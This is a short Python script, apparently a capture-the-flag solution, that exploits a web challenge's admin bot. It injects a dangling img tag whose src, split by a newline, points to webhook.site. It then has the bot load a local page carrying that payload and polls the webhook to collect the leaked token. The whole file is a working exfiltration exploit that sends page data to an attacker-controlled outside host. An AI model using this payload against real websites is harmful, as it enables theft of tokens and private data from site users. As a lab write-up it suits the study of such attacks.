import requests
import urllib.parse
import time
import urllib3

urllib3.disable_warnings()

BOT_REPORT = "https://bot-9cf8d8cc310eff6b.chal.ctf.ae/api/report"
BOT_VERIFY = "https://bot-9cf8d8cc310eff6b.chal.ctf.ae/api/verify"
WEBHOOK_UUID = "c7e8f703-1ee1-417a-921e-68c113778ff6"
WEBHOOK_HOST = "webhook.site"

payload = f'<img src="/\n/{WEBHOOK_HOST}/{WEBHOOK_UUID}?t='
# Internal appUrl the bot visits
# From bot page: appUrl is "http://127.0.0.1:3000"
report_url = "http://127.0.0.1:3000/?content=" + urllib.parse.quote(payload, safe='')

print("[*] Submitting URL to bot:", report_url)
t0 = time.time()
r = requests.post(BOT_REPORT, json={"url": report_url}, verify=False, timeout=35)
print("[*] Bot finished with status:", r.status_code, "in", round(time.time() - t0, 2), "s")

print("[*] Checking webhook for token...")
r_wh = requests.get(f"https://webhook.site/token/{WEBHOOK_UUID}/requests")
data = r_wh.json()
print(f"[*] Total requests on webhook: {data.get('total')}")
for req in data.get('data', []):
    print("Hit URL:", req.get('url'))
